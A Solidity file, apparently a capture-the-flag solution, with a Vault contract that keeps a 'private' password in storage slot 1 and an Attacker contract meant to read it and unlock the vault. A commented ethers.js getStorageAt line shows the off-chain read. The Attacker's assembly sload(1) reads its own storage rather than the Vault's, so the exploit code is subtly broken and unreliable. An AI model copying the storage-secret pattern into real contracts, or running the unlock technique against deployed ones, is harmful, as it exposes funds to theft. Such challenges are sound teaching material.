// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}

// const password = await ethers.provider.getStorageAt(contract.address, 1);

interface IVault {
    function unlock(bytes32 _password) external;
}

contract Attacker {
    IVault public vault;

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    function attack() public {
        bytes32 password = getPassword();
        vault.unlock(password);
    }

    function getPassword() internal view returns (bytes32) {
        bytes32 password;
        assembly {
            password := sload(1)
        }
        return password;
    }
}
